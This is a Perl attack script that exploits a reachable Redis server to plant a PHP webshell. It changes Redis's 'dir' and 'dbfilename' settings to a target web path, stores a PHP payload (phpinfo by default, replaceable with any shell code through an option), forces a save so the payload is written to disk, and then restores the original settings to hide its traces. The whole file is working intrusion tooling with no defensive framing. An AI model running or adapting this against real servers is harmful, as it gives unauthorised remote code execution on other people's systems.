#!/usr/bin/perl

use strict;
use warnings;
use utf8;
use feature 'say';
use lib '/secure/Common/src/cpan';

use FindBin;
use lib "$FindBin::Bin/lib";
use Getopt::Long;
use Data::Dumper;
use LWP::UserAgent;
use File::Basename;
use Redis::Client;

$| = 1;
binmode(STDOUT, ':encoding(utf8)');

my %opts = (
    shell => '<?php phpinfo (); ?>',
    path  => undef,
    host  => undef,
    port  => undef
);
GetOptions (\%opts, 'path|p=s', 'host|h=s', 'port|p=i', 'shell|s=s');
die "Required parameters: host, port, and path\n" unless defined $opts{host} and defined $opts{port} and defined $opts{path};

my $client = Redis::Client->new (host => $opts{host}, port => $opts{port});
my @values;

say '[+] Connection established ', $opts{host}, ':', $opts{port};

say '[+] Receiving old dbfilename value';
@values = $client->config_get ('dbfilename');
$opts{dbfilename} = $values[1];

say '[+] Receiving old dir value';
@values = $client->config_get ('dir');
$opts{dir} = $values[1];

say '[+] Alternating configuration';
say '    -> dir ', dirname $opts{path};
$client->config_set ('dir', dirname $opts{path});

say '    -> dbfilename ', basename $opts{path};
$client->config_set ('dbfilename', basename $opts{path});

say '    -> webshell ', $opts{shell};
$client->set ('webshell', $opts{shell});

$client->save;

say '[+] Restoring configuration';
$client->config_set ('dir', $opts{dir});
$client->config_set ('dbfilename', $opts{dbfilename});




